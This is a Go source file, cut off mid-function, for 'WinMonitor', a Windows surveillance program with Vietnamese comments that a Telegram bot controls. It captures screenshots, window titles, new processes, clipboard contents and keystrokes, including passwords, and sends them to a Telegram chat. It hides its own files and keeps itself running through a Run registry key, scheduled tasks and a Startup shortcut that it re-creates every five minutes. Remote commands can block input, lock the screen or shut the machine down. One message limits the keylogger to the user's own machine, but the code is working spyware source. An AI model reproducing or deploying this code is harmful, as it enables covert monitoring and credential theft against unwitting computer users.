package main

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const appName = "WinMonitor"
const appVer = "1.1.0"

// maxBlockMinutes: van an toan cung — du config=0, ban phim/chuot van tu mo sau N phut.
const maxBlockMinutes = 30

// maxPhotoBytes: > nguong nay thi gui dang document (sendPhoto gioi han 10MB).
const maxPhotoBytes = 9 * 1024 * 1024

var (
	appData    = getEnv("APPDATA", homeDir())
	baseDir    = filepath.Join(appData, appName)
	configPath = filepath.Join(baseDir, "config.json")
	logPath    = filepath.Join(baseDir, "monitor.log")
	deployExe  = filepath.Join(baseDir, "WinMonitor.exe")
	launcher   = filepath.Join(baseDir, "WinMonitor.lnk")
	startupDir = filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	startupLnk = filepath.Join(startupDir, "WinMonitor.lnk")
	startTime  = time.Now()
	httpClient = &http.Client{Timeout: 45 * time.Second}
	stopMain   = make(chan struct{})
	exitOnce   sync.Once
)

// ---- Config ----
type Config struct {
	BotToken           string `json:"bot_token"`
	ChatID             string `json:"chat_id"`
	ScreenshotInterval int    `json:"screenshot_interval"`
	ScreenshotsEnabled bool   `json:"screenshots_enabled"`
	ActivityMonitor    bool   `json:"activity_monitor"`
	ProcessMonitor     bool   `json:"process_monitor"`
	ClipboardMonitor   bool   `json:"clipboard_monitor"`
	Keylogger          bool   `json:"keylogger"`
	KeylogFlush        int    `json:"keylog_flush"`
	BlockSafetyMinutes int    `json:"block_safety_minutes"`
	HeartbeatInterval  int    `json:"heartbeat_interval"`
	AllowAutoBind      bool   `json:"allow_autobind"`
}

func defaultConfig() Config {
	return Config{
		BotToken:           "PUT_YOUR_BOT_TOKEN_HERE",
		ChatID:             "PUT_YOUR_CHAT_ID_HERE",
		ScreenshotInterval: 300,
		ScreenshotsEnabled: true,
		ActivityMonitor:    true,
		ProcessMonitor:     true,
		ClipboardMonitor:   false,
		Keylogger:          false,
		KeylogFlush:        60,
		BlockSafetyMinutes: 0,
		HeartbeatInterval:  3600,
		AllowAutoBind:      true,
	}
}

// Validate chuan hoa/clampp gia tri (issue #8/#10).
func (c *Config) Validate() {
	clamp := func(v, lo, hi int) int {
		if v < lo {
			return lo
		}
		if v > hi {
			return hi
		}
		return v
	}
	c.ScreenshotInterval = clamp(c.ScreenshotInterval, 5, 86400)
	c.KeylogFlush = clamp(c.KeylogFlush, 10, 3600)
	if c.HeartbeatInterval != 0 {
		c.HeartbeatInterval = clamp(c.HeartbeatInterval, 60, 86400)
	}
	if c.BlockSafetyMinutes < 0 {
		c.BlockSafetyMinutes = 0
	}
	if c.BlockSafetyMinutes > 1440 {
		c.BlockSafetyMinutes = 1440
	}
}

var (
	cfgMu sync.RWMutex
	cfg   = defaultConfig()
)

func getEnv(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}

func homeDir() string {
	h, _ := os.UserHomeDir()
	return h
}

// applyConfigData unmarshal đè lên base (trường thiếu giữ nguyên base) rồi Validate.
func applyConfigData(base Config, data []byte) (Config, bool) {
	var c Config = base
	if err := json.Unmarshal(data, &c); err != nil {
		return base, false
	}
	c.Validate()
	return c, true
}

func loadConfig() {
	cfg = defaultConfig()
	if fileExists(configPath) {
		if data, err := os.ReadFile(configPath); err == nil {
			if c, ok := applyConfigData(cfg, data); ok {
				cfg = c
			}
		}
	} else {
		bs := bootstrapConfigPath()
		if fileExists(bs) {
			if data, err := os.ReadFile(bs); err == nil {
				if c, ok := applyConfigData(cfg, data); ok {
					cfg = c
					logMsg("Đã nạp cấu hình đóng gói từ " + bs)
				}
			}
			// Dọn bản config công khai cạnh .exe sau khi đã nhập vào %APPDATA% (issue #4)
			saveConfig()
			if err := os.Remove(bs); err == nil {
				logMsg("Đã xóa file config công khai cạnh .exe sau khi nhập.")
			}
		}
	}
	saveConfig()
}

func saveConfig() {
	os.MkdirAll(baseDir, 0o755)
	cfgMu.RLock()
	data, _ := json.MarshalIndent(cfg, "", "  ")
	cfgMu.RUnlock()
	tmp := configPath + ".tmp"
	if os.WriteFile(tmp, data, 0o600) == nil {
		os.Rename(tmp, configPath)
		hideFile(configPath)
		restrictToCurrentUser(configPath)
	}
}

func cfgGet() Config {
	cfgMu.RLock()
	defer cfgMu.RUnlock()
	return cfg
}

func cfgUpdate(fn func(*Config)) {
	cfgMu.Lock()
	fn(&cfg)
	cfg.Validate()
	cfgMu.Unlock()
	saveConfig()
}

func bootstrapConfigPath() string {
	exe, _ := os.Executable()
	return filepath.Join(filepath.Dir(exe), "winmonitor.config.json")
}

func fileExists(p string) bool {
	_, err := os.Stat(p)
	return err == nil
}

// ---- Logging ----
var logMu sync.Mutex

func logMsg(msg string) {
	logMu.Lock()
	defer logMu.Unlock()
	os.MkdirAll(baseDir, 0o755)
	line := fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), msg)
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return
	}
	f.WriteString(line)
	f.Close()
	if st, err := os.Stat(logPath); err == nil && st.Size() > 2*1024*1024 {
		data, _ := os.ReadFile(logPath)
		lines := strings.Split(string(data), "\n")
		if len(lines) > 2000 {
			lines = lines[len(lines)-2000:]
		}
		os.WriteFile(logPath, []byte(strings.Join(lines, "\n")), 0o644)
	}
}

// ---- Telegram ----
func tgURL(method string) string {
	return "https://api.telegram.org/bot" + cfgGet().BotToken + "/" + method
}

func tgCall(method string, params map[string]string, filePath, fileField string) map[string]interface{} {
	var resp *http.Response
	var err error
	if filePath != "" {
		var buf bytes.Buffer
		w := multipart.NewWriter(&buf)
		for k, v := range params {
			w.WriteField(k, v)
		}
		f, e := os.Open(filePath)
		if e != nil {
			return map[string]interface{}{"ok": false, "error": e.Error()}
		}
		part, _ := w.CreateFormFile(fileField, filepath.Base(filePath))
		io.Copy(part, f)
		f.Close()
		w.Close()
		req, _ := http.NewRequest("POST", tgURL(method), &buf)
		req.Header.Set("Content-Type", w.FormDataContentType())
		resp, err = httpClient.Do(req)
	} else {
		form := url.Values{}
		for k, v := range params {
			form.Set(k, v)
		}
		resp, err = httpClient.PostForm(tgURL(method), form)
	}
	if err != nil {
		return map[string]interface{}{"ok": false, "error": err.Error()}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var out map[string]interface{}
	json.Unmarshal(body, &out)
	return out
}

// retryAfterOf đọc retry_after từ lỗi 429 (issue #19/#27).
func retryAfterOf(res map[string]interface{}) int {
	if p, ok := res["parameters"].(map[string]interface{}); ok {
		if ra, ok := p["retry_after"].(float64); ok {
			return int(ra)
		}
	}
	return 0
}

func isNetworkError(res map[string]interface{}) bool {
	_, hasErr := res["error"]
	_, hasCode := res["error_code"]
	return hasErr && !hasCode
}

func htmlEscape(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	return s
}

func hasChat() bool {
	c := cfgGet().ChatID
	return c != "" && !strings.Contains(c, "PUT_YOUR")
}

// ---- Send queue (bounded, drop-oldest khi day - issue #12) ----
type sendItem struct {
	kind    string // "text" | "photo" | "doc"
	text    string
	path    string
	caption string
	markup  string // reply_markup JSON (tùy chọn)
	tries   int
}

const maxSendTries = 20

type sendQueue struct {
	mu     sync.Mutex
	cond   *sync.Cond
	items  []sendItem
	max    int
	closed bool
}

func newSendQueue(max int) *sendQueue {
	q := &sendQueue{max: max}
	q.cond = sync.NewCond(&q.mu)
	return q
}

func (q *sendQueue) push(it sendItem) {
	q.mu.Lock()
	defer q.mu.Unlock()
	if q.closed {
		return
	}
	if len(q.items) >= q.max {
		// Bỏ item cũ nhất; nếu là ảnh/doc thì xóa file tạm
		old := q.items[0]
		if old.kind != "text" && old.path != "" {
			os.Remove(old.path)
		}
		q.items = q.items[1:]
	}
	q.items = append(q.items, it)
	q.cond.Signal()
}

func (q *sendQueue) pop() (sendItem, bool) {
	q.mu.Lock()
	defer q.mu.Unlock()
	for len(q.items) == 0 && !q.closed {
		q.cond.Wait()
	}
	if len(q.items) == 0 {
		return sendItem{}, false
	}
	it := q.items[0]
	q.items = q.items[1:]
	return it, true
}

func (q *sendQueue) tryPop() (sendItem, bool) {
	q.mu.Lock()
	defer q.mu.Unlock()
	if len(q.items) == 0 {
		return sendItem{}, false
	}
	it := q.items[0]
	q.items = q.items[1:]
	return it, true
}

func (q *sendQueue) len() int {
	q.mu.Lock()
	defer q.mu.Unlock()
	return len(q.items)
}

var sendQ = newSendQueue(300)

var running = true
var runMu sync.Mutex

func setRunning(v bool) {
	runMu.Lock()
	running = v
	runMu.Unlock()
}

func isRunning() bool {
	runMu.Lock()
	defer runMu.Unlock()
	return running
}

func notify(text string) {
	if !hasChat() {
		return
	}
	sendQ.push(sendItem{kind: "text", text: text})
}

func notifyMarkup(text, markup string) {
	if !hasChat() {
		return
	}
	sendQ.push(sendItem{kind: "text", text: text, markup: markup})
}

func notifyPhoto(path, caption string) {
	if !hasChat() {
		return
	}
	sendQ.push(sendItem{kind: "photo", path: path, caption: caption})
}

// deliver gửi 1 item, tự xử lý 429 + lỗi mạng. Trả về ok.
func deliver(item sendItem, chat string) bool {
	if item.kind == "text" {
		t := item.text
		if len(t) > 4000 {
			t = t[:4000]
		}
		params := map[string]string{
			"chat_id": chat, "text": t, "parse_mode": "HTML",
			"disable_web_page_preview": "true",
		}
		if item.markup != "" {
			params["reply_markup"] = item.markup
		}
		res := tgCall("sendMessage", params, "", "")
		return handleSendResult(res)
	}
	if !fileExists(item.path) {
		return true
	}
	cap := item.caption
	if len(cap) > 1000 {
		cap = cap[:1000]
	}
	st, _ := os.Stat(item.path)
	if st != nil && st.Size() > maxPhotoBytes {
		// Ảnh quá lớn -> gửi dạng document (issue #16)
		res := tgCall("sendDocument", map[string]string{
			"chat_id": chat, "caption": cap, "parse_mode": "HTML",
		}, item.path, "document")
		os.Remove(item.path)
		return handleSendResult(res)
	}
	res := tgCall("sendPhoto", map[string]string{
		"chat_id": chat, "caption": cap, "parse_mode": "HTML",
	}, item.path, "photo")
	os.Remove(item.path)
	return handleSendResult(res)
}

// handleSendResult trả về false nếu cần retry (lỗi mạng / 429 đã ngủ).
func handleSendResult(res map[string]interface{}) bool {
	if ok, _ := res["ok"].(bool); ok {
		return true
	}
	if ra := retryAfterOf(res); ra > 0 {
		time.Sleep(time.Duration(ra) * time.Second)
		return false
	}
	if isNetworkError(res) {
		return false
	}
	return true // lỗi API khác (vd chat sai) -> bỏ, không retry vô hạn
}

func senderLoop() {
	backoff := time.Second
	for isRunning() {
		item, ok := sendQ.pop()
		if !ok {
			return
		}
		chat := cfgGet().ChatID
		if chat == "" {
			continue
		}
		okSent := deliver(item, chat)
		if !okSent {
			item.tries++
			if item.tries > maxSendTries {
				logMsg(fmt.Sprintf("Bỏ tin sau %d lần thử (lỗi mạng kéo dài).", maxSendTries))
				if item.kind != "text" && item.path != "" {
					os.Remove(item.path)
				}
				backoff = time.Second
				continue
			}
			// lỗi mạng: backoff + đẩy lại để thử tiếp (không mất tin quan trọng)
			time.Sleep(backoff)
			if backoff < 60*time.Second {
				backoff *= 2
			}
			sendQ.push(item)
			continue
		}
		backoff = time.Second
		time.Sleep(1050 * time.Millisecond)
	}
}

// ---- Screenshot loop ----
func doScreenshotSend(prefix string) {
	if sendQ.len() > 240 {
		logMsg("Bỏ qua chụp: hàng đợi gửi đang đầy (có thể mất mạng).")
		return
	}
	path := filepath.Join(baseDir, "shot_"+time.Now().Format("20060102_150405")+".png")
	if takeScreenshot(path) {
		notifyPhoto(path, fmt.Sprintf("%s <b>Chụp màn hình</b>\n🕒 %s", prefix, time.Now().Format("15:04:05 02/01/2006")))
	} else {
		notify("⚠️ Không chụp được màn hình.")
	}
}

func screenshotLoop() {
	var last time.Time
	for isRunning() {
		c := cfgGet()
		if c.ScreenshotsEnabled {
			interval := c.ScreenshotInterval
			if interval < 5 {
				interval = 5
			}
			if time.Since(last) >= time.Duration(interval)*time.Second {
				doScreenshotSend("📸")
				last = time.Now()
			}
		}
		time.Sleep(1 * time.Second)
	}
}

// ---- Window monitor ----
func windowMonitor() {
	last := ""
	for isRunning() {
		if cfgGet().ActivityMonitor {
			t := foregroundTitle()
			if t != "" && t != last {
				last = t
				notify("🪟 <b>Cửa sổ:</b> " + htmlEscape(t))
			}
		} else {
			last = ""
		}
		time.Sleep(2 * time.Second)
	}
}

// ---- Process monitor ----
var ignoreProc = map[string]bool{
	"conhost.exe": true, "powershell.exe": true, "tasklist.exe": true, "cmd.exe": true,
	"svchost.exe": true, "python.exe": true, "pythonw.exe": true, "backgroundtaskhost.exe": true,
	"winmonitor.exe": true,
}

func processMonitor() {
	var prev map[string]bool
	for isRunning() {
		if cfgGet().ProcessMonitor {
			procs := listProcesses()
			cur := map[string]bool{}
			for _, p := range procs {
				cur[p.PID+"|"+p.Name] = true
			}
			if prev != nil {
				count := 0
				for _, p := range procs {
					key := p.PID + "|" + p.Name
					if !prev[key] && !ignoreProc[strings.ToLower(p.Name)] {
						notify(fmt.Sprintf("🚀 <b>Tiến trình mới:</b> %s <code>(PID %s)</code>", htmlEscape(p.Name), p.PID))
						count++
						if count >= 15 {
							break // tránh spam khi cài phần mềm hàng loạt (issue #19)
						}
					}
				}
			}
			prev = cur
		} else {
			prev = nil
		}
		time.Sleep(5 * time.Second)
	}
}

// ---- Clipboard monitor ----
func clipboardMonitor() {
	last := ""
	for isRunning() {
		if cfgGet().ClipboardMonitor {
			c := getClipboard()
			if c != "" && c != last {
				last = c
				if len(c) > 1500 {
					c = c[:1500]
				}
				notify("📋 <b>Clipboard:</b>\n<code>" + htmlEscape(c) + "</code>")
			}
		} else {
			last = ""
		}
		time.Sleep(3 * time.Second)
	}
}

// ---- Keylogger ----
var vkSpecial = map[int]string{
	0x08: "[BKSP]", 0x09: "[TAB]", 0x0D: "[ENTER]", 0x1B: "[ESC]",
	0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]",
	0x2E: "[DEL]", 0x24: "[HOME]", 0x23: "[END]", 0x21: "[PGUP]", 0x22: "[PGDN]",
	0x14: "[CAPS]", 0x5B: "[WIN]", 0x5C: "[WIN]",
}

var vkShiftMap = map[string]string{
	"1": "!", "2": "@", "3": "#", "4": "$", "5": "%", "6": "^", "7": "&",
	"8": "*", "9": "(", "0": ")", "-": "_", "=": "+", "[": "{", "]": "}",
	"\\": "|", ";": ":", "'": "\"", ",": "<", ".": ">", "/": "?", "`": "~",
}

var vkPunct = map[int]string{
	0xBA: ";", 0xBB: "=", 0xBC: ",", 0xBD: "-", 0xBE: ".", 0xBF: "/",
	0xC0: "`", 0xDB: "[", 0xDC: "\\", 0xDD: "]", 0xDE: "'",
}

func vkToText(vk int, shift bool) string {
	if s, ok := vkSpecial[vk]; ok {
		return s
	}
	if vk >= 0x30 && vk <= 0x39 {
		ch := string(rune(vk))
		if shift {
			if m, ok := vkShiftMap[ch]; ok {
				return m
			}
		}
		return ch
	}
	if vk >= 0x41 && vk <= 0x5A {
		ch := string(rune(vk))
		if shift {
			return ch
		}
		return strings.ToLower(ch)
	}
	if vk == 0x20 {
		return " "
	}
	if vk >= 0x60 && vk <= 0x69 {
		return string(rune(vk - 0x30))
	}
	if base, ok := vkPunct[vk]; ok {
		if shift {
			if m, ok := vkShiftMap[base]; ok {
				return m
			}
		}
		return base
	}
	return ""
}

var (
	keyBufMu sync.Mutex
	keyBuf   strings.Builder
	hookOK   bool
)

func keySink(t string) {
	if !cfgGet().Keylogger {
		return
	}
	keyBufMu.Lock()
	keyBuf.WriteString(t)
	keyBufMu.Unlock()
}

func keyBufLen() int {
	keyBufMu.Lock()
	defer keyBufMu.Unlock()
	return keyBuf.Len()
}

func keyBufTake() string {
	keyBufMu.Lock()
	defer keyBufMu.Unlock()
	s := keyBuf.String()
	keyBuf.Reset()
	return s
}

func keyloggerLoop() {
	pressed := map[int]bool{}
	lastFlush := time.Now()
	for isRunning() {
		c := cfgGet()
		if !c.Keylogger {
			pressed = map[int]bool{}
			keyBufTake() // xóa buffer khi tắt
			time.Sleep(500 * time.Millisecond)
			continue
		}
		// Nếu không cài được hook -> dùng polling dự phòng (issue #15)
		if !hookOK {
			shift := keyDown(0x10)
			for vk := 8; vk < 256; vk++ {
				down := keyDown(vk)
				if down && !pressed[vk] {
					pressed[vk] = true
					if t := vkToText(vk, shift); t != "" {
						keyBufMu.Lock()
						keyBuf.WriteString(t)
						keyBufMu.Unlock()
					}
				} else if !down && pressed[vk] {
					delete(pressed, vk)
				}
			}
		}
		flush := c.KeylogFlush
		if flush < 10 {
			flush = 10
		}
		if keyBufLen() > 0 && time.Since(lastFlush) >= time.Duration(flush)*time.Second {
			text := keyBufTake()
			lastFlush = time.Now()
			if strings.TrimSpace(text) != "" {
				if len(text) > 3000 {
					text = text[:3000]
				}
				notify("⌨️ <b>Phím gõ:</b>\n<code>" + htmlEscape(text) + "</code>")
			}
		}
		time.Sleep(30 * time.Millisecond)
	}
}

// ---- Persistence ----
func launcherTarget() string { return deployExe }

func deploySrc() string {
	exe, _ := os.Executable()
	return exe
}

func registerScheduledTasks() {
	tr := `"` + launcherTarget() + `"`
	if err := runHidden("schtasks", "/Create", "/TN", "WinMonitorGuard", "/TR", tr, "/SC", "MINUTE", "/MO", "5", "/F"); err != nil {
		logMsg("schtasks Guard lỗi: " + err.Error())
	}
	if err := runHidden("schtasks", "/Create", "/TN", "WinMonitorLogon", "/TR", tr, "/SC", "ONLOGON", "/F"); err != nil {
		logMsg("schtasks Logon lỗi: " + err.Error())
	}
}

func registerRunKey() {
	val := `"` + launcherTarget() + `"`
	if err := runHidden("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "WinMonitor", "/t", "REG_SZ", "/d", val, "/f"); err != nil {
		logMsg("reg add Run lỗi: " + err.Error())
	}
}

func copyHidden(src, dst string) bool {
	if err := copyFile(src, dst); err != nil {
		logMsg("copy_hidden error: " + err.Error())
		return false
	}
	hideFile(dst)
	return true
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

func ensurePersistence() {
	os.MkdirAll(baseDir, 0o755)
	src := deploySrc()
	if filepath.Clean(deployExe) != filepath.Clean(src) {
		copyHidden(src, deployExe)
	} else {
		hideFile(deployExe)
	}
	if !fileExists(launcher) {
		if !createShortcut(launcher, deployExe, "", filepath.Dir(deployExe)) {
			logMsg("Tạo shortcut launcher thất bại (có thể bị chặn PowerShell).")
		}
	}
	hideFile(launcher)
	os.MkdirAll(startupDir, 0o755)
	if !createShortcut(startupLnk, deployExe, "", filepath.Dir(deployExe)) {
		logMsg("Tạo shortcut Startup thất bại (có thể bị chặn PowerShell).")
	}
	hideFile(startupLnk)
	registerRunKey()
	registerScheduledTasks()
}

func selfhealLoop() {
	for isRunning() {
		time.Sleep(300 * time.Second)
		if isRunning() {
			ensurePersistence()
			cleanupOldShots(2 * time.Hour)
		}
	}
}

func cleanupOldShots(maxAge time.Duration) {
	entries, err := os.ReadDir(baseDir)
	if err != nil {
		return
	}
	now := time.Now()
	for _, e := range entries {
		name := e.Name()
		if strings.HasPrefix(name, "shot_") && strings.HasSuffix(name, ".png") {
			if info, err := e.Info(); err == nil {
				if now.Sub(info.ModTime()) > maxAge {
					os.Remove(filepath.Join(baseDir, name))
				}
			}
		}
	}
}

func removePersistence() {
	for _, tn := range []string{"WinMonitorGuard", "WinMonitorLogon"} {
		runHidden("schtasks", "/Delete", "/TN", tn, "/F")
	}
	runHidden("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "WinMonitor", "/f")
	self, _ := os.Executable()
	for _, p := range []string{deployExe, launcher, startupLnk} {
		if filepath.Clean(p) != filepath.Clean(self) {
			os.Remove(p)
		}
	}
	moveFileOnReboot(self)
}

// ---- OTP ----
type pendingOtp struct {
	code    string
	expires time.Time
}

var (
	pendingMu   sync.Mutex
	pending     = map[string]pendingOtp{}
	otpFailures int
)

// genOtp sinh mã 6 chữ số bằng CSPRNG (issue #5/#26).
func genOtp() string {
	var b [4]byte
	rand.Read(b[:])
	n := binary.BigEndian.Uint32(b[:]) % 1000000
	return fmt.Sprintf("%06d", n)
}

func requestOtp(action, label string) {
	code := genOtp()
	pendingMu.Lock()
	pending[action] = pendingOtp{code: code, expires: time.Now().Add(120 * time.Second)}
	otpFailures = 0
	pendingMu.Unlock()
	notify(fmt.Sprintf("🔐 <b>XÁC NHẬN %s</b>\nMã dùng 1 lần: <code>%s</code>\nGửi <code>/confirm %s</code> trong vòng 120 giây.\nGửi /cancel để hủy.", label, code, code))
}

// requestExit thoát êm: giải phóng BlockInput rồi dừng (issue #29).
func requestExit() {
	exitOnce.Do(func() {
		setRunning(false)
		close(stopMain)
	})
}

func executeAction(action string) {
	switch action {
	case "shutdown":
		notify("🖥️ Đang TẮT MÁY (sau 5 giây)...")
		time.Sleep(time.Second)
		shutdownMachine()
	case "restart":
		notify("🔄 Đang KHỞI ĐỘNG LẠI (sau 5 giây)...")
		time.Sleep(time.Second)
		restartMachine()
	case "stop":
		notify("🛑 Đã xác thực. Đang DỪNG GIÁM SÁT và gỡ khỏi khởi động cùng Windows...")
		removePersistence()
		time.Sleep(1500 * time.Millisecond)
		requestExit()
	}
}

// ---- Bot command menu ----
var botCommands = [][2]string{
	{"start", "Bắt đầu / xem trợ giúp"},
	{"help", "Danh sách lệnh"},
	{"status", "Trạng thái hiện tại"},
	{"shot", "Chụp màn hình ngay"},
	{"interval", "Đổi chu kỳ chụp (giây)"},
	{"screen", "Bật/tắt chụp định kỳ"},
	{"activity", "Bật/tắt báo đổi cửa sổ"},
	{"process", "Bật/tắt báo tiến trình mới"},
	{"clip", "Bật/tắt theo dõi clipboard"},
	{"keylog", "Bật/tắt ghi phím gõ"},
	{"block", "Ngắt bàn phím & chuột"},
	{"unblock", "Kết nối lại bàn phím & chuột"},
	{"lock", "Khóa màn hình"},
	{"shutdown", "Tắt máy (cần OTP)"},
	{"restart", "Khởi động lại (cần OTP)"},
	{"stop", "Dừng giám sát (cần OTP)"},
	{"confirm", "Xác nhận mã OTP"},
	{"cancel", "Hủy yêu cầu đang chờ"},
	{"config", "Xem cấu hình"},
	{"get", "Xem 1 khóa cấu hình"},
	{"set", "Đổi cấu hình: /set khóa giá_trị"},
	{"reset", "Đặt lại cấu hình mặc định"},
	{"reload_config", "Nạp lại config từ file"},
	{"logs", "Xem log gần đây"},
	{"reload", "Cập nhật lại menu lệnh"},
}

func registerBotCommands() bool {
	var arr []map[string]string
	for _, c := range botCommands {
		arr = append(arr, map[string]string{"command": c[0], "description": c[1]})
	}
	data, _ := json.Marshal(arr)
	for attempt := 0; attempt < 3; attempt++ {
		if !isRunning() {
			return false
		}
		res := tgCall("setMyCommands", map[string]string{"commands": string(data)}, "", "")
		if ok, _ := res["ok"].(bool); ok {
			tgCall("setChatMenuButton", map[string]string{"menu_button": `{"type":"commands"}`}, "", "")
			logMsg(fmt.Sprintf("Bot commands registered (%d lenh).", len(botCommands)))
			return true
		}
		time.Sleep(3 * time.Second)
	}
	return false
}

// ---- Command handling ----
func helpText() string {
	return "🤖 <b>WIN MONITOR</b> - Trợ lý giám sát\n\n" +
		"<b>Giám sát</b>\n" +
		"/status - Trạng thái hiện tại\n" +
		"/shot - Chụp màn hình ngay\n" +
		"/interval &lt;giây&gt; - Đổi chu kỳ chụp\n" +
		"/screen on|off - Bật/tắt chụp định kỳ\n" +
		"/activity on|off - Báo đổi cửa sổ\n" +
		"/process on|off - Báo tiến trình mới\n" +
		"/clip on|off - Theo dõi clipboard\n" +
		"/keylog on|off - Ghi phím gõ\n\n" +
		"<b>Điều khiển</b>\n" +
		"/block [phút] - Ngắt bàn phím & chuột\n" +
		"/unblock - Kết nối lại bàn phím & chuột\n" +
		"/lock - Khóa màn hình\n\n" +
		"<b>Nguy hiểm (cần OTP)</b>\n" +
		"/shutdown - Tắt máy\n" +
		"/restart - Khởi động lại\n" +
		"/stop - Dừng giám sát\n" +
		"/confirm &lt;mã&gt; - Xác nhận OTP\n" +
		"/cancel - Hủy yêu cầu\n\n" +
		"<b>Cấu hình</b>\n" +
		"/config - Xem toàn bộ\n" +
		"/get &lt;khóa&gt; - Xem 1 khóa\n" +
		"/set &lt;khóa&gt; &lt;giá trị&gt; - Đổi\n" +
		"/reset - Về mặc định\n" +
		"/reload_config - Nạp lại từ file\n" +
		"/logs [n] - Xem log\n" +
		"/reload - Cập nhật menu lệnh"
}

// mainKeyboard là inline keyboard các lệnh hay dùng (issue #38).
func mainKeyboard() string {
	return `{"inline_keyboard":[[{"text":"📸 Chụp","callback_data":"/shot"},{"text":"📊 Trạng thái","callback_data":"/status"}],[{"text":"🔒 Khóa","callback_data":"/lock"},{"text":"⌨️ Keylog on","callback_data":"/keylog on"}],[{"text":"🛑 Block","callback_data":"/block"},{"text":"🔓 Unblock","callback_data":"/unblock"}]]}`
}

func parseBool(v string) bool {
	switch strings.ToLower(strings.TrimSpace(v)) {
	case "1", "on", "true", "yes", "bat", "bật", "co", "có":
		return true
	}
	return false
}

func handleCommand(text, chatID string) {
	text = strings.TrimSpace(text)
	if !strings.HasPrefix(text, "/") {
		return
	}
	fields := strings.Fields(text)
	cmd := strings.ToLower(strings.SplitN(fields[0], "@", 2)[0])
	args := fields[1:]

	switch cmd {
	case "/start":
		notifyMarkup(helpText(), mainKeyboard())
	case "/help":
		notify(helpText())
	case "/reload":
		notify("🔄 Đang cập nhật lại menu lệnh...")
		go registerBotCommands()
	case "/status":
		c := cfgGet()
		up := int(time.Since(startTime).Seconds())
		blocked := "BÌNH THƯỜNG"
		if isInputBlocked() {
			blocked = "ĐANG NGẮT"
		}
		elev := "Thường"
		if isElevated() {
			elev = "Admin"
		}
		klMode := "hook"
		if !hookOK {
			klMode = "polling"
		}
		remote := ""
		if isRemoteSession() {
			remote = " | RDP"
		}
		notify(fmt.Sprintf("📊 <b>TRẠNG THÁI</b>\n⏱ Uptime: %dh %dm %ds\n📸 Chụp: %s | mỗi %ds\n🪟 Cửa sổ: %s\n🚀 Tiến trình: %s\n📋 Clipboard: %s\n⌨️ Keylog: %s (%s)\n🔒 Bàn phím/chuột: %s\n🛡 Quyền: %s%s\n📤 Hàng đợi: %d\n💓 Heartbeat: %ds",
			up/3600, (up%3600)/60, up%60,
			onoff(c.ScreenshotsEnabled), c.ScreenshotInterval,
			onoff(c.ActivityMonitor), onoff(c.ProcessMonitor), onoff(c.ClipboardMonitor),
			onoff(c.Keylogger), klMode, blocked, elev, remote, sendQ.len(), c.HeartbeatInterval))
	case "/shot":
		notify("⏳ Đang chụp...")
		go doScreenshotSend("📸")
	case "/interval":
		if len(args) == 0 || !isDigits(args[0]) {
			notify("Cú pháp: /interval <giây> (5–86400)")
			return
		}
		v, _ := strconv.Atoi(args[0])
		cfgUpdate(func(c *Config) { c.ScreenshotInterval = v })
		notify(fmt.Sprintf("✅ Đã đổi chu kỳ chụp thành %d giây.", cfgGet().ScreenshotInterval))
	case "/screen", "/activity", "/process", "/clip", "/keylog":
		if len(args) == 0 {
			notify("Cú pháp: " + cmd + " on|off")
			return
		}
		b := parseBool(args[0])
		cfgUpdate(func(c *Config) {
			switch cmd {
			case "/screen":
				c.ScreenshotsEnabled = b
			case "/activity":
				c.ActivityMonitor = b
			case "/process":
				c.ProcessMonitor = b
			case "/clip":
				c.ClipboardMonitor = b
			case "/keylog":
				c.Keylogger = b
			}
		})
		if cmd == "/keylog" && b {
			notify("⚠️ Đã BẬT keylogger — công cụ này ghi lại MỌI phím gõ (kể cả mật khẩu). Chỉ dùng trên máy của chính bạn và khi thật cần. Gõ /keylog off để tắt.")
		}
		notify(fmt.Sprintf("✅ %s = %s", cmd, onoff(b)))
	case "/block":
		auto := 0
		if len(args) > 0 && isDigits(args[0]) {
			auto, _ = strconv.Atoi(args[0])
		}
		if auto == 0 {
			auto = cfgGet().BlockSafetyMinutes
		}
		// Van an toan cung: luôn có thời hạn tự mở (issue #11/#14)
		if auto <= 0 || auto > maxBlockMinutes {
			auto = maxBlockMinutes
		}
		if isInputBlocked() {
			notify("ℹ️ Bàn phím/chuột đang bị ngắt rồi.")
			return
		}
		go func() {
			_, ok := StartBlock(auto)
			if !ok {
				notify("⚠️ Không ngắt được bàn phím/chuột (có thể cần quyền Admin).")
				return
			}
			notify(fmt.Sprintf("🔒 Đã NGẮT bàn phím & chuột. Tự mở khóa sau %d phút (van an toàn) hoặc gửi /unblock.", auto))
		}()
	case "/unblock":
		if StopBlock() {
			notify("🔓 Đang kết nối lại bàn phím & chuột...")
		} else {
			notify("ℹ️ Bàn phím/chuột đang bình thường.")
		}
	case "/lock":
		if lockWorkstation() {
			notify("🔒 Đã khóa màn hình.")
		} else {
			notify("⚠️ Không khóa được màn hình.")
		}
	case "/shutdown":
		requestOtp("shutdown", "TẮT MÁY")
	case "/restart", "/reboot":
		requestOtp("restart", "KHỞI ĐỘNG LẠI")
	case "/stop":
		requestOtp("stop", "DỪNG GIÁM SÁT")
	case "/confirm":
		if len(args) == 0 {
			notify("Cú pháp: /confirm <mã>")
			return
		}
		code := strings.TrimSpace(args[0])
		pendingMu.Lock()
		for action, info := range pending {
			if time.Now().After(info.expires) {
				delete(pending, action)
				continue
			}
			if info.code == code {
				delete(pending, action)
				otpFailures = 0
